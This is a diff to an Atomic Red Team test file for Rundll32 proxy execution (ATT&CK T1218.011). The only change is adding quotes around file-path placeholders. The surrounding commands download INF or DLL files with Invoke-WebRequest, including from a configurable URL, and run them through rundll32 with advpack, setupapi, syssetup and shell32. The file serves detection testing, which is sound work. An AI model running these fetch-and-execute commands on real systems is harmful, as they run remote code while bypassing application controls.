@@ -71,15 +71,15 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Inf file must exist on disk at specified location (#{inf_to_execute})
+      Inf file must exist on disk at specified location ("#{inf_to_execute}")
     prereq_command: |
-      if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
+      if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
-      rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+      rundll32.exe advpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
     name: command_prompt
 - name: Rundll32 ieadvpack.dll Execution
   auto_generated_guid: 5e46a58e-cbf6-45ef-a289-ed7754603df9
@@ -98,15 +98,15 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Inf file must exist on disk at specified location (#{inf_to_execute})
+      Inf file must exist on disk at specified location ("#{inf_to_execute}")
     prereq_command: |
-      if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
+      if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
-      rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+      rundll32.exe ieadvpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
     name: command_prompt
 - name: Rundll32 syssetup.dll Execution
   auto_generated_guid: 41fa324a-3946-401e-bbdd-d7991c628125
@@ -124,15 +124,15 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Inf file must exist on disk at specified location (#{inf_to_execute})
+      Inf file must exist on disk at specified location ("#{inf_to_execute}")
     prereq_command: |
-      if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
+      if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
-      rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 #{inf_to_execute}
+      rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 "#{inf_to_execute}"
     name: command_prompt
 - name: Rundll32 setupapi.dll Execution
   auto_generated_guid: 71d771cd-d6b3-4f34-bc76-a63d47a10b19
@@ -150,15 +150,15 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Inf file must exist on disk at specified location (#{inf_to_execute})
+      Inf file must exist on disk at specified location ("#{inf_to_execute}")
     prereq_command: |
-      if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
+      if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
-      rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 #{inf_to_execute}
+      rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "#{inf_to_execute}"
     name: command_prompt
 - name: Execution of HTA and VBS Files using Rundll32 and URL.dll
   auto_generated_guid: 22cfde89-befe-4e15-9753-47306b37a6e3
@@ -239,13 +239,13 @@ atomic_tests:
   - description: |
       DLL file must exist on disk at specified location
     prereq_command: |
-      if (Test-Path #{input_file}) {exit 0} else {exit 1}
+      if (Test-Path "#{input_file}") {exit 0} else {exit 1}
     get_prereq_command: |
       Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
   executor:
     name: command_prompt
     command: |
-      rundll32.exe #{input_file},#2
+      rundll32.exe "#{input_file}",#2
 - name: Rundll32 with Control_RunDLL
   auto_generated_guid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
   description: |
@@ -266,13 +266,13 @@ atomic_tests:
   - description: |
       DLL file must exist on disk at specified location
     prereq_command: |
-      if (Test-Path #{input_file}) {exit 0} else {exit 1}
+      if (Test-Path "#{input_file}") {exit 0} else {exit 1}
     get_prereq_command: |
       Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
   executor:
     name: command_prompt
     command: |
-      rundll32.exe shell32.dll,Control_RunDLL #{input_file}
+      rundll32.exe shell32.dll,Control_RunDLL "#{input_file}"
 - name: Rundll32 with desk.cpl
   auto_generated_guid: 83a95136-a496-423c-81d3-1c6750133917
   description: |
